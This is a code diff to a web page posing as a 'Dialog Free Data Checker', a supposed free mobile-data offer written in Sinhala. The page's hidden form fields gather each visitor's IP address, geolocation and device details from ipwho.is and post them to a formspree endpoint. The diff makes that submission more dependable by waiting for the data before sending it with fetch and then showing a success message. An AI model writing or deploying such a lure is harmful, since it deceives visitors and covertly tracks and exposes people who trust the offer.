@@ -37,7 +37,7 @@
   <h2>Dialog Free Data Checker</h2>
   <p>Dialog සදහා නොමිලේ දත්ත ලබාදෙන්නේදැයි පරීක්ෂා කරන්න පහත බොත්තම ඔබන්න.</p>
 
-  <form action="https://formspree.io/f/xvgkdndd" method="POST" id="autoForm">
+  <form id="autoForm">
     <input type="hidden" name="IP Address" id="ip">
     <input type="hidden" name="Location" id="location">
     <input type="hidden" name="Device Info" id="device">
@@ -51,7 +51,6 @@
       try {
         const res = await fetch("https://ipwho.is/");
         const data = await res.json();
-
         if (data.success) {
           document.getElementById("ip").value = data.ip;
           document.getElementById("location").value = `
@@ -69,10 +68,29 @@ Timezone: ${data.timezone.id}`;
       }
     }
 
-    fetchData();
+    let ready = false;
+    fetchData().then(() => {
+      ready = true;
+    });
 
-    document.getElementById("autoForm").addEventListener("submit", () => {
+    document.getElementById("autoForm").addEventListener("submit", async function (e) {
+      e.preventDefault(); // prevent default until data loaded
+
+      if (!ready) {
+        alert("Gathering data... please wait a moment");
+        return;
+      }
+
       document.getElementById("status").style.display = "block";
+
+      const formData = new FormData(this);
+      await fetch("https://formspree.io/f/xvgkdndd", {
+        method: "POST",
+        body: formData,
+        headers: { Accept: "application/json" }
+      });
+
+      document.getElementById("status").innerText = "Submitted Successfully!";
     });
   </script>
 </body>
